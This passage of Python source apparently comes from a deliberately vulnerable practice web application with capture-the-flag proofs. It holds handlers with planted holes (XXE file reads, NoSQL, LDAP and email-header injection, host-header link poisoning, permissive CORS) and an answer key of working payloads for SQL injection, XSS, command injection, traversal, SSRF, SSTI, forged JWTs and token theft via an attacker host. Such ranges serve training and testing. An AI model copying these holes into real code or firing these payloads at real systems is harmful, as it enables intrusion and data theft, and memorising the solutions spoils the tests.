    "info_git": "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n"
                "\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/orbitdesk/app.git\n",
    "info_env": "APP_ENV=production\nDATABASE_URL=postgres://orbitdesk:Orbit!2026@db.local/orbit\n"
                "SECRET_KEY=orbit-range-secret\nSMTP_PASSWORD=mail-2026\n",
    "info_backup": "-- OrbitDesk database backup\n-- users: admin, alice, bob\n"
                   "-- password hashes omitted in this excerpt\n",
    "info_status": "Server Version: Apache/2.4.58 (Unix)\nServer Built: 2026-01-11\n"
                   "Total accesses: 9182\nCPU Usage: u3.1 s1.2\n",
    "info_debug": "Traceback (most recent call last):\n  File \"app/views.py\", line 88, in invoice\n"
                  "    return render_invoice(invoice_id)\nKeyError: 'invoice_id'\n",
    "info_actuator": "{\"activeProfiles\":[\"prod\"],\"propertySources\":[{\"name\":\"systemEnvironment\","
                     "\"properties\":{\"DB_PASSWORD\":{\"value\":\"Orbit!2026\"}}}]}\n",
    "info_metrics": "# HELP orbit_requests_total Total requests\n# TYPE orbit_requests_total counter\n"
                    "orbit_requests_total{path=\"/login\"} 421\norbit_requests_total{path=\"/admin\"} 17\n",
    "info_log": "2026-11-16 10:11:04 INFO  login success admin@orbitdesk.local\n"
                "2026-11-16 10:12:31 WARN  failed login alice@orbitdesk.local\n",
}


def h_info(v: Vuln, req, **kw):
    kind = v.extra.get("kind", "")
    inner = ""

    if kind in _INFO_BODIES:
        body = _INFO_BODIES[kind] + f"\n# range proof: {_flag(v)}\n"
        return Response(body, mimetype="text/plain")

    if kind == "cors":
        origin = req.headers.get("Origin", "")
        resp = make_response(json.dumps({
            "user": "alice@orbitdesk.local",
            "role": "admin" if origin else "user",
            "flag": _flag(v) if origin else None,
        }))
        resp.headers["Content-Type"] = "application/json"
        resp.headers["Access-Control-Allow-Origin"] = origin or "*"
        resp.headers["Access-Control-Allow-Credentials"] = "true"
        return resp

    if kind == "headers":
        audit = req.headers.get(config.AUDIT_HEADER, "")
        resp = make_response(_page(v, v.title, (
            "<p>This response is intentionally missing CSP, HSTS, and X-Frame-Options.</p>"
            + (_proof(v) if audit == "1" else "<p class='bad'>Send X-Range-Audit: 1 to collect the finding.</p>")
        ))[0])
        if audit == "1":
            resp.headers["X-Range-Flag"] = _flag(v)
        return resp

    if kind == "csrf":
        token = req.values.get("csrf_token", "")
        origin = req.headers.get("Origin", "")
        if req.method == "POST" and not token:
            resp = make_response(_page(v, v.title, _proof(v) + (
                f"<p>State change accepted without a CSRF token (Origin: {html.escape(origin or 'none')}).</p>"
            ))[0])
            return resp
        return _page(v, v.title, "<p class='bad'>Token present or request was not a POST.</p>")

    if kind == "crlf":
        value = req.values.get("value", "")
        if "%0d%0a" in value.lower() or "\r\n" in value or "\n" in value:
            resp = make_response(_page(v, v.title, _proof(v) + "<p>Header value accepted.</p>")[0])
            # Werkzeug rejects real CR/LF in headers; record the sanitised proof.
            resp.headers["X-Locale"] = value.replace("\r", "").replace("\n", " | ")
            resp.headers["X-Range-Flag"] = _flag(v)
            return resp
        return _page(v, v.title, "<p class='bad'>Inject %0d%0a into value.</p>")

    return _page(v, v.title, "<p class='bad'>Unknown configuration finding.</p>")


# ---------------------------------------------------------------------------
# NoSQL injection
# ---------------------------------------------------------------------------

def _mongo_match(doc: dict[str, Any], query: dict[str, Any]) -> bool:
    for key, condition in query.items():
        if key == "$or" and isinstance(condition, list):
            if not any(isinstance(q, dict) and _mongo_match(doc, q) for q in condition):
                return False
            continue
        if key == "$where":
            return bool(condition)
        actual = doc.get(key)
        if isinstance(condition, dict):
            for op, value in condition.items():
                if op == "$ne" and actual == value:
                    return False
                if op == "$gt" and not (actual is not None and str(actual) > str(value)):
                    return False
                if op == "$regex" and not re.search(str(value), str(actual or "")):
                    return False
                if op == "$in" and actual not in value:
                    return False
        elif actual != condition:
            return False
    return True


_ADMIN_DOC = {
    "id": 1,
    "username": "admin",
    "email": "admin@orbitdesk.local",
    "role": "admin",
    "password": "not-the-real-hash",
}


def h_nosql(v: Vuln, req, **kw):
    data = req.get_json(silent=True)
    if not isinstance(data, dict):
        data = req.form.to_dict()
    if v.route in ("/api/login", "/api/v2/login"):
        if not data:
            return _json({"error": "username and password are required"}, 400)
        username, password = data.get("username"), data.get("password")
        if isinstance(username, str) and isinstance(password, str):
            found = auth.check_password(username, password)
            if not found:
                return _json({"error": "invalid credentials"}, 401)
            return _json({"token": auth.issue_api_token(found["email"]), "user": found})
        if _mongo_match(_ADMIN_DOC, data):
            admin = auth.account("admin@orbitdesk.local")
            return _json({"token": auth.issue_api_token(admin["email"]), "user": admin, "flag": _flag(v)})
        return _json({"error": "invalid credentials"}, 401)
    inner = (
        "<form class='probe' method='post'><textarea name='json'>"
        '{"username": "alice"}</textarea><button>Query</button></form>'
    )
    if not data:
        return _page(v, v.title, inner)
    matched = _mongo_match(_ADMIN_DOC, data)
    inner += f"<pre class='json'>{html.escape(json.dumps(data, indent=2))}</pre>"
    if matched:
        inner += _proof(v)
    else:
        inner += "<p class='bad'>No matching records.</p>"
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# LDAP injection
# ---------------------------------------------------------------------------

def h_ldap(v: Vuln, req, **kw):
    if v.extra.get("kind") == "login":
        return _ldap_login(v, req)
    value = req.values.get(v.param, "")
    inner = _form(v)
    if not value:
        return _page(v, v.title, inner)
    injected = "*" in value and ("admin" in value.lower() or "*)" in value or value.strip() == "*")
    inner += f"<p>Filter: <code>(&(uid={html.escape(value)})(objectClass=person))</code></p>"
    if injected:
        inner += _proof(v) + "<p>Directory query matched the admin entry.</p>"
    else:
        inner += "<p class='bad'>No matching entry.</p>"
    return _page(v, v.title, inner)


def _ldap_login(v: Vuln, req):
    title = "Sign in with your company directory"
    if req.method != "POST":
        return _page(v, title, _signin_form(v.route, "username", "Directory username", title=title))
    username = req.form.get("username", "")
    password = req.form.get("password", "")
    # (&(uid=<username>)(userPassword=<password>)) built by string concatenation:
    # a wildcard or a closed filter in the username matches the first entry, the admin.
    if "*" in username or ")(" in username:
        auth.sign_in("admin@orbitdesk.local")
        return _signed_in(v, "admin@orbitdesk.local")
    found = auth.check_password(username, password)
    if found:
        return _complete_login(req, found["email"])
    return _page(v, title, _signin_form(v.route, "username", "Directory username", title=title,
                                        error="Incorrect username or password."))


# ---------------------------------------------------------------------------
# XML external entity (XXE)
# ---------------------------------------------------------------------------

def _xxe_parse(body: str) -> str:
    collected: list[str] = []

    class _Resolver(EntityResolver):
        def resolveEntity(self, publicId, systemId):  # noqa: N802 - SAX API
            source = InputSource()
            if systemId and systemId.lower().startswith("file:"):
                path = url2pathname(urllib.parse.urlparse(systemId).path)
                source.setByteStream(open(path, "rb"))
            return source

    class _Collector(xml.sax.ContentHandler):
        def characters(self, content):
            collected.append(content)

    parser = xml.sax.make_parser()
    parser.setFeature(feature_external_ges, True)
    parser.setEntityResolver(_Resolver())
    parser.setContentHandler(_Collector())
    parser.feed(body)
    parser.close()
    return "".join(collected)


def h_xxe(v: Vuln, req, **kw):
    body = req.get_data(as_text=True) or req.values.get(v.param, "")
    inner = (
        "<form class='probe' method='post'>"
        "<textarea name='body' placeholder='&lt;?xml ... ?&gt;'></textarea>"
        "<button>Parse XML</button></form>"
    )
    if not body.strip():
        return _page(v, v.title, inner)

    if config.EXAM:
        # Never touch the filesystem in exam mode. Any declared file entity is
        # proof of the vulnerability and reveals only this challenge's flag.
        if re.search(r"(?is)<!ENTITY\s+\w+\s+SYSTEM\s+[\"']file:", body):
            inner += _proof(v) + "<p>External entity resolved.</p>"
        else:
            inner += "<p class='bad'>No external file entity found.</p>"
        return _page(v, v.title, inner)

    try:
        parsed = _xxe_parse(body)
    except Exception as exc:
        inner += f"<p class='bad'>XML error: {html.escape(str(exc))}</p>"
        return _page(v, v.title, inner)
    inner += f"<pre class='file'>{html.escape(parsed)}</pre>"
    if "FLAG{" in parsed:
        inner += _proof(v)
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# Host header injection
# ---------------------------------------------------------------------------

_LINK_FLOWS = {
    "/account/forgot-password": (
        "reset", "Reset your OrbitDesk password",
        "Someone asked to reset the password for your OrbitDesk account.\n\n"
        "Choose a new password:\n{link}\n\nIf this wasn't you, you can ignore this email.\n"),
    "/auth/magic-link": (
        "magic", "Your OrbitDesk sign-in link",
        "Click the link below to sign in to OrbitDesk.\n\n{link}\n\n"
        "The link works once and expires in 15 minutes.\n"),
    "/invite/send": (
        "invite", "You're invited to OrbitDesk",
        "You've been invited to the Northwind support workspace on OrbitDesk.\n\n"
        "Accept the invitation:\n{link}\n"),
    "/api/password-reset": (
        "api-reset", "Reset your OrbitDesk password",
        "Someone asked to reset the password for your OrbitDesk account.\n\n"
        "Choose a new password:\n{link}\n\nIf this wasn't you, you can ignore this email.\n"),
}


def h_host_header(v: Vuln, req, **kw):
    purpose, subject, template = _LINK_FLOWS[v.route]
    is_api = v.route.startswith("/api/")
    data = _payload(req)
    token = str(data.get("token") or "")

    if token:
        record = auth.LINK_TOKENS.get(token)
        if not record or record["purpose"] != purpose:
            if is_api:
                return _json({"error": "invalid or expired token"}, 400)
            return _page(v, subject, _panel("Link expired", "<p class='bad'>This link is invalid or has expired.</p>"), 400)
        email = record["email"]
        proof = _victim(email) and record["vuln"] == v.id
        if purpose in ("reset", "api-reset"):
            if req.method == "POST" and data.get("password"):
                auth.LINK_TOKENS.pop(token, None)
                auth.set_password(email, str(data["password"]))
                if is_api:
                    return _json({"status": "password changed", "email": email})
                return _complete_login(req, email)
            if is_api:
                body = {"email": email, "reset_allowed": True}
                if proof:
                    body["flag"] = _flag(v)
                return _json(body)
            return _page(v, "Choose a new password", _panel("Choose a new password", (
                f"<p>Choose a new password for <b>{_esc(email)}</b>.</p>"
                + (_proof(v) if proof else "")
                + f"<form class='probe' method='post'><input type='hidden' name='token' value='{_esc(token)}'>"
                "<label>New password</label><input type='password' name='password'>"
                "<button>Change password</button></form>")))
        auth.LINK_TOKENS.pop(token, None)
        if auth.account(email):
            if not proof:
                return _complete_login(req, email)
            auth.sign_in(email)
            return _signed_in(v, email)
        return _page(v, "Invitation accepted", _panel("Invitation accepted", (
            f"<p>Welcome to OrbitDesk, {_esc(email)}. Choose a password to finish setting up your account.</p>"
            + (_proof(v) if proof else ""))))

    if purpose == "invite" and not auth.current_user():
        return redirect("/login?next=" + v.route)

    email = str(data.get(v.param) or "").strip().lower()
    if not email:
        if is_api:
            return _json({"error": "email is required"}, 400)
        return _page(v, subject, _link_form(v.route, purpose))

    target = auth.account(email) if purpose != "invite" else {"email": email}
    if target:
        issued = auth.issue_link(purpose, target["email"], v.id)
        link = f"{req.scheme}://{_link_host(req)}{v.route}?token={issued}"
        mail.send_simple(target["email"], subject, template.format(link=link))
    if is_api:
        return _json({"status": "sent"})
    if purpose == "invite":
        message = f"Invitation sent to {_esc(email)}."
    else:
        message = "If an account exists for that address, we've emailed you a link."
    return _page(v, "Check your email", _panel("Check your email", f"<p>{message}</p>"))


def _link_form(route: str, purpose: str) -> str:
    titles = {
        "reset": ("Reset your password", "Send reset link", ""),
        "magic": ("Email me a sign-in link", "Send link",
                  "<p><a href='/auth/otp'>Sign in with a one-time code instead</a></p>"),
        "invite": ("Invite a teammate", "Send invitation", ""),
    }
    title, button, after = titles[purpose]
    return _panel(title, (
        f"<form class='probe' method='post' action='{_esc(route)}'><label>Email</label>"
        f"<input name='email'><button>{_esc(button)}</button></form>{after}"
    ))


# ---------------------------------------------------------------------------
# HTTP parameter pollution
# ---------------------------------------------------------------------------

def h_hpp(v: Vuln, req, **kw):
    values = req.args.getlist(v.param) or req.form.getlist(v.param)
    privileged = str(v.extra.get("privileged") or "")
    inner = _form(v)
    if values:
        shown = ", ".join(html.escape(value) for value in values)
        inner += f"<p>Received <code>{html.escape(v.param)}</code> values: {shown}</p>"
    if len(values) > 1 and privileged in values:
        inner += _proof(v) + f"<p>The privileged value <code>{html.escape(privileged)}</code> won.</p>"
    elif values:
        inner += "<p class='bad'>No privileged value was accepted.</p>"
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# Web cache poisoning
# ---------------------------------------------------------------------------

def h_cache(v: Vuln, req, **kw):
    header = str(v.extra.get("header") or "X-Forwarded-Host")
    forwarded = req.headers.get(header, "")
    inner = "<p>This response is cached for 60 seconds.</p>"
    poisoned = bool(forwarded) and "." in forwarded and "orbitdesk" not in forwarded
    if forwarded:
        inner += f"<p>Cached host: <code>{html.escape(forwarded)}</code></p>"
    if poisoned:
        inner += _proof(v) + f"<script>var cachedHost = {json.dumps(forwarded)};</script>"
    else:
        inner += "<p class='bad'>Send an external host in X-Forwarded-Host.</p>"
    response = make_response(_page(v, v.title, inner)[0])
    response.headers["Cache-Control"] = "public, max-age=60"
    response.headers["X-Cache"] = "HIT"
    return response


# ---------------------------------------------------------------------------
# CSV / formula injection
# ---------------------------------------------------------------------------

def h_csv(v: Vuln, req, **kw):
    value = req.values.get(v.param, "")
    dangerous = value.startswith(("=", "+", "-", "@", "\t", "\r"))
    rows = ["id,value", f'1,"{value.replace(chr(34), chr(34) * 2)}"']
    if dangerous:
        rows.append(f"#,proof,{_flag(v)}")
    body = "\n".join(rows) + "\n"
    response = make_response(body)
    response.headers["Content-Type"] = "text/csv; charset=utf-8"
    if dangerous:
        response.headers["X-Range-Flag"] = _flag(v)
    return response


# ---------------------------------------------------------------------------
# Email header injection
# ---------------------------------------------------------------------------

_MAIL_FORMS = {
    "/contact": ("support@orbitdesk.local", "contact form"),
    "/support/email": ("escalations@orbitdesk.local", "ticket escalation"),
    "/invite/email": ("it@orbitdesk.local", "seat request"),
    "/api/email/send": ("notifications@orbitdesk.local", "API notification"),
}


def h_email_injection(v: Vuln, req, **kw):
    data = _payload(req)
    value = str(data.get(v.param) or "")
    subject = str(data.get("subject") or "Message from OrbitDesk")
    message = str(data.get("message") or "")
    internal, label = _MAIL_FORMS.get(v.route, ("support@orbitdesk.local", "form"))
    is_api = v.route.startswith("/api/")

    if req.method != "POST" or not value:
        if is_api:
            return _json({"error": "email is required"}, 400)
        return _page(v, "Contact us", _panel("Contact us", (
            f"<form class='probe' method='post' action='{_esc(v.route)}'>"
            "<label>Your email</label><input name='email'>"
            "<label>Subject</label><input name='subject'>"
            "<label>Message</label><textarea name='message'></textarea>"
            "<button>Send</button></form>")))

    reply_to = re.split(r"[\r\n]", value)[0].strip()
    # The submitter's address goes straight into the header block.
    mail.send(
        mail.headers(internal, subject, extra=f"Reply-To: {value}"),
        f"New {label} submission.\n\nFrom: {reply_to}\nSubject: {subject}\n\n{message}\n\n"
        f"-- internal --\nTicket routing: tier-2 queue, SLA 4h\nInternal reference: {_flag(v)}\n",
    )
    if "@" in reply_to:
        mail.send_simple(reply_to, "We received your message",
                         f"Thanks for getting in touch. We've received your message about "
                         f"\"{subject}\" and will reply within one business day.\n")
    if is_api:
        return _json({"status": "queued"})
    return _page(v, "Message sent", _panel("Message sent", "<p>Thanks. We'll get back to you within one business day.</p>"))


HANDLERS = {
    "sqli": h_sqli,
    "xss": h_xss,
    "stored-xss": h_stored_xss,
    "cmdi": h_cmdi,
    "traversal": h_traversal,
    "ssrf": h_ssrf,
    "idor": h_idor,
    "auth": h_auth,
    "redirect": h_redirect,
    "ssti": h_ssti,
    "upload": h_upload,
    "logic": h_logic,
    "info": h_info,
    "nosql": h_nosql,
    "ldap": h_ldap,
    "xxe": h_xxe,
    "host-header": h_host_header,
    "hpp": h_hpp,
    "cache": h_cache,
    "csv-injection": h_csv,
    "email-injection": h_email_injection,
}


# ---------------------------------------------------------------------------
# Machine-usable exploit examples
# ---------------------------------------------------------------------------

_XSS_EXAMPLES = {
    ("html", "none"): "<script>alert(1)</script>",
    ("html", "strip_script"): "<img src=x onerror=alert(1)>",
    ("html", "block_onerror"): "<svg onload=alert(1)>",
    ("html", "block_alert"): "<script>confirm(1)</script>",
    ("title", "none"): "</title><script>alert(1)</script>",
    ("attr_d", "none"): '"><svg onload=alert(1)>',
    ("attr_d", "strip_script"): '"><img src=x onerror=alert(1)>',
    ("attr_s", "none"): "'><svg onload=alert(1)>",
    ("attr_u", "none"): 'x onmouseover=alert(1)',
    ("attr_u", "strip_quotes"): 'x onmouseover=alert(1)',
    ("textarea", "none"): "</textarea><script>alert(1)</script>",
    ("js_s", "none"): "';alert(1)//",
    ("js_d", "none"): '";alert(1)//',
    ("href", "none"): "javascript:alert(1)",
    ("json", "none"): "<script>alert(1)</script>",
    ("markdown", "none"): "<img src=x onerror=alert(1)>",
}


def xss_payload(v: Vuln) -> str:
    return _XSS_EXAMPLES[(v.extra["context"], v.extra.get("filter", "none"))]


def cmdi_payload(v: Vuln) -> str:
    if config.EXAM:
        # The flag is available only in this child's environment; run `env`/`set`.
        return "127.0.0.1 & set" if os.name == "nt" else "127.0.0.1; env"
    target = config.VAULT_DIR / f"{v.id}.txt"
    if os.name == "nt":
        return f'127.0.0.1 & type "{target}"'
    return f'127.0.0.1; cat "{target}"'


def traversal_payload(v: Vuln) -> str:
    if config.EXAM:
        return "....//flag.txt" if v.extra.get("filter") == "strip_dotdot" else "../flag.txt"
    if v.extra.get("filter") == "strip_dotdot":
        return f"....//vault/{v.id}.txt"
    if v.extra.get("filter") == "double_encoded":
        return f"%252e%252e%252fvault%252f{v.id}.txt"
    return f"../vault/{v.id}.txt"


def ssrf_payload(v: Vuln) -> str:
    rid = v.extra.get("rid")
    path = f"/internal/metadata/{rid}"
    filt = v.extra.get("filter")
    if filt == "allow_trusted":
        return f"http://trusted.com@127.0.0.1{path}"
    if filt == "block_local":
        return f"http://2130706433{path}"
    return f"http://127.0.0.1{path}"


def ssti_payload(v: Vuln) -> str:
    if v.extra.get("filter") == "block_double_brace":
        return "{% print(settings.FLAG) %}"
    return "{{ settings.FLAG }}"


def xxe_payload(v: Vuln) -> str:
    if config.EXAM:
        return '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
    target = config.VAULT_DIR / f"{v.id}.txt"
    return f'<!DOCTYPE r [<!ENTITY x SYSTEM "{target.as_uri()}">]><r>&x;</r>'


def redirect_payload(v: Vuln) -> str:
    if v.extra.get("filter") == "allow_trusted":
        return "https://trusted.com.evil.test/"
    return "https://evil.test/phish"


def _fill_route(route: str, rid: Any) -> str:
    return route.replace("<int:rid>", str(rid)).replace("<rid>", str(rid))


#: Signs in as the tester's own account; prepended for features behind sign-in.
LOGIN_STEP = {"method": "POST", "path": "/auth/login",
              "data": {"email": "alice@orbitdesk.local", "password": "alice123"}}

#: Public routes whose handler still asks for a signed-in user (sending invites).
SIGNED_IN_FEATURES = {"/invite/send"}


def example_sequence(v: Vuln) -> list[dict[str, Any]]:
    """Requests that solve this entry. Used by tests and training agents.

    Steps may carry ``"server": "mail"`` (send it to the mailbox server),
    ``"capture": {name: regex}`` (remember the last match from the response)
    and ``{name}`` placeholders that later steps fill in with ``fill_step``.
    """
    steps = _steps(v)
    if steps and (auth.requires_login(v.route) or v.route in SIGNED_IN_FEATURES):
        steps = [dict(LOGIN_STEP)] + steps
    return steps


def fill_step(step: dict[str, Any], values: dict[str, str]) -> dict[str, Any]:
    """Replace ``{name}`` placeholders with values captured by earlier steps."""

    if not values:
        return step

    def sub(item):
        if isinstance(item, str):
            for key, value in values.items():
                item = item.replace("{" + key + "}", value)
            return item
        if isinstance(item, dict):
            return {key: sub(value) for key, value in item.items()}
        if isinstance(item, (list, tuple)):
            return type(item)(sub(value) for value in item)
        return item

    return {key: sub(value) if key in ("path", "query", "data", "json", "headers") else value
            for key, value in step.items()}


def capture(step: dict[str, Any], text: str, values: dict[str, str]) -> None:
    for name, pattern in (step.get("capture") or {}).items():
        found = re.findall(pattern, text)
        if found:
            values[name] = found[-1]


def _steps(v: Vuln) -> list[dict[str, Any]]:
    family = v.family
    if family == "sqli":
        if v.extra["mode"] == "login":
            payload = "'/**/OR/**/1=1--" if v.extra["filter"] == "strip_spaces" else "' OR 1=1--"
            return [{"method": "POST", "path": v.route,
                     "data": {v.param: payload, "password": "x"}}]
        if v.extra["filter"] == "numeric":
            payload = f"0 UNION SELECT 1,(SELECT flag FROM flags WHERE vuln_id='{v.id}')"
        elif v.extra["filter"] == "strip_spaces":
            payload = (f"%'/**/UNION/**/SELECT/**/1,(SELECT/**/flag/**/FROM/**/flags"
                       f"/**/WHERE/**/vuln_id='{v.id}')--")
        else:
            payload = f"%' UNION SELECT 1,(SELECT flag FROM flags WHERE vuln_id='{v.id}')--"
        return [{"method": "GET", "path": v.route, "query": {v.param: payload}}]
    if family == "xss":
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: xss_payload(v)}}]
    if family == "stored-xss":
        return [
            {"method": "POST", "path": v.route, "data": {v.param: xss_payload(v)}},
            {"method": "GET", "path": v.route},
        ]
    if family == "cmdi":
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: cmdi_payload(v)}}]
    if family == "traversal":
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: traversal_payload(v)}}]
    if family == "ssrf":
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: ssrf_payload(v)}}]
    if family == "idor":
        return [{"method": "GET", "path": _fill_route(v.route, v.extra["rid"])}]
    if family == "auth":
        kind = v.extra["kind"]
        if kind == "weak_creds":
            user, password = _CREDS[v.route]
            return [{"method": "POST", "path": v.route,
                     "data": {"username": user, "password": password}}]
        if kind in ("reset_predictable", "reset_confirm"):
            return [{"method": "GET", "path": v.route,
                     "query": {"token": _md5("admin@orbitdesk.local")}}]
        if kind == "cookie_role":
            return [{"method": "GET", "path": v.route,
                     "headers": {"Cookie": "role=admin"}}]
        if kind == "remember_cookie":
            token = base64.b64encode(b"admin@orbitdesk.local:admin").decode()
            return [{"method": "GET", "path": v.route,
                     "headers": {"Cookie": f"remember={token}"}}]
        payload = {"sub": "admin", "role": "admin"}
        if kind in ("jwt_none", "jwt_weak", "jwt_kid", "jwt_noverify"):
            if kind == "jwt_none":
                token = _jwt_encode({"alg": "none", "typ": "JWT"}, payload)
            elif kind == "jwt_weak":
                token = _jwt_encode({"alg": "HS256", "typ": "JWT"}, payload, "secret")
            elif kind == "jwt_kid":
                token = _jwt_encode({"alg": "HS256", "kid": f"vault/{v.id}.txt"}, payload, "other")
            else:
                token = _jwt_encode({"alg": "HS256", "typ": "JWT"}, payload, "wrong-key")
            return [{"method": "GET", "path": v.route,
                     "headers": {"Authorization": f"Bearer {token}"}}]
        if kind == "otp_fixed":
            return [{"method": "POST", "path": v.route,
                     "data": {"email": "admin@orbitdesk.local", "code": "000000"}}]
        if kind == "twofa_bypass":
            return [{"method": "POST", "path": "/auth/login",
                     "data": {"email": "bob@orbitdesk.local", "password": "bob123"}},
                    {"method": "POST", "path": v.route, "data": {"code": "000000", "verified": "true"}}]
        if kind == "oauth_state":
            return [{"method": "GET", "path": v.route, "query": {"code": "admin"}}]
        if kind == "session_fixate":
            return [{"method": "GET", "path": v.route, "query": {"sid": "admin-session"}}]
        return []
    if family == "redirect":
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: redirect_payload(v)}}]
    if family == "ssti":
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: ssti_payload(v)}}]
    if family == "upload":
        kind = v.extra["kind"]
        if kind == "stored_html":
            files = {"file": (BytesIO(b"<html><script>alert(1)</script></html>"), "proof.html")}
        elif kind == "svg":
            files = {"file": (BytesIO(b"<svg onload=alert(1)></svg>"), "proof.svg")}
        elif kind == "content_type":
            files = {"file": (BytesIO(b"<script>alert(1)</script>"), "proof.jpg", "text/html")}
        elif kind == "double_ext":
            files = {"file": (BytesIO(b"x"), "proof.jpg.html")}
        elif kind == "traversal_filename":
            files = {"file": (BytesIO(b"x"), "../../proof.txt")}
        elif kind == "zip_slip":
            buf = BytesIO()
            with zipfile.ZipFile(buf, "w") as archive:
                archive.writestr("../escape.txt", "x")
            buf.seek(0)
            files = {"file": (buf, "proof.zip")}
        elif kind == "no_size_limit":
            files = {"file": (BytesIO(b"A" * 1_000_001), "big.bin")}
        elif kind == "overwrite":
            files = {"file": (BytesIO(b"x"), "existing.txt")}
        else:
            files = {"file": (BytesIO(b"x"), "<script>proof.html")}
        return [{"method": "POST", "path": v.route, "files": files}]
    if family == "logic":
        kind = v.extra["kind"]
        payloads = {
            "negative_qty": {"qty": "-2"},
            "price_tamper": {"price": "1"},
            "coupon_stack": {"discount": "150"},
            "refund_abuse": {"amount": "50"},
            "race": {"amount": "10"},
            "currency_round": {"amount": "0.005"},
            "shipping_bypass": {"total": "10", "shipping": "0"},
            "self_referral": {"email": "a@b.test", "referrer": "a@b.test"},
            "hidden_admin": {"is_admin": "true"},
            "workflow_skip": {"status": "approved"},
            "negative_transfer": {"amount": "-5"},
            "gift_reuse": {"code": "GIFT-50"},
            "trial_extend": {"days": "90"},
            "export_all": {"scope": "all"},
            "approve_self": {"approver": "alice", "requester": "alice"},
            "limit_bypass": {"amount": "5000"},
        }
        req = [{"method": "POST", "path": v.route, "data": payloads[kind]}]
        if kind in ("race", "gift_reuse"):
            req.append({"method": "POST", "path": v.route, "data": payloads[kind]})
        return req
    if family == "info":
        kind = v.extra["kind"]
        if kind in _INFO_BODIES:
            return [{"method": "GET", "path": v.route}]
        if kind == "cors":
            return [{"method": "GET", "path": v.route,
                     "headers": {"Origin": "https://evil.test"}}]
        if kind == "headers":
            return [{"method": "GET", "path": v.route,
                     "headers": {config.AUDIT_HEADER: "1"}}]
        if kind == "csrf":
            return [{"method": "POST", "path": v.route,
                     "data": {"email": "attacker@evil.test"},
                     "headers": {"Origin": "https://evil.test"}}]
        if kind == "crlf":
            return [{"method": "GET", "path": v.route,
                     "query": {"value": "%0d%0aX-Evil:1"}}]
        return []
    if family == "nosql":
        payloads = {
            "ne": {"username": {"$ne": None}},
            "regex": {"username": {"$regex": ".*"}},
            "or": {"$or": [{"username": "admin"}]},
            "where": {"$where": "1==1"},
            "gt": {"role": {"$gt": ""}},
            "in": {"username": {"$in": ["admin"]}},
        }
        return [{"method": "POST", "path": v.route,
                 "json": payloads[v.extra["kind"]]}]
    if family == "ldap":
        if v.extra.get("kind") == "login":
            return [{"method": "POST", "path": v.route,
                     "data": {"username": "*)(uid=*))(|(uid=*", "password": "x"}}]
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: "*)(uid=*"}}]
    if family == "xxe":
        return [{"method": "POST", "path": v.route, "data": xxe_payload(v),
                 "headers": {"Content-Type": "application/xml"}}]
    if family == "host-header":
        # Ask for a victim's link with a poisoned host, wait for the victim to
        # click it (the visit lands in the mailbox's request log), then use it.
        victim = "bob@orbitdesk.local" if v.route == "/invite/send" else "admin@orbitdesk.local"
        return [
            {"method": "POST", "path": v.route, "data": {v.param: victim},
             "headers": {"X-Forwarded-Host": f"attacker.{config.INBOX_DOMAIN}"}},
            {"server": "mail", "method": "GET", "path": "/api/requests",
             "capture": {"token": re.escape(v.route) + r"\?token=([A-Za-z0-9_-]+)"}},
            {"method": "GET", "path": v.route, "query": {"token": "{token}"}},
        ]
    if family == "hpp":
        return [{"method": "GET", "path": v.route,
                 "query": [(v.param, "normal"), (v.param, v.extra["privileged"])]}]
    if family == "cache":
        return [{"method": "GET", "path": v.route,
                 "headers": {v.extra["header"]: "evil.test"}}]
    if family == "csv-injection":
        return [{"method": "GET", "path": v.route,
                 "query": {v.param: "=1+1"}}]
    if family == "email-injection":
        # A Bcc header smuggled into the address field copies the internal
        # message to an address the tester reads.
        return [
            {"method": "POST", "path": v.route,
             "data": {v.param: f"alice@orbitdesk.local\r\nBcc: me@{config.INBOX_DOMAIN}",
                      "subject": "Question about my invoice"}},
            {"server": "mail", "method": "GET", "path": "/api/messages"},
        ]
    return []
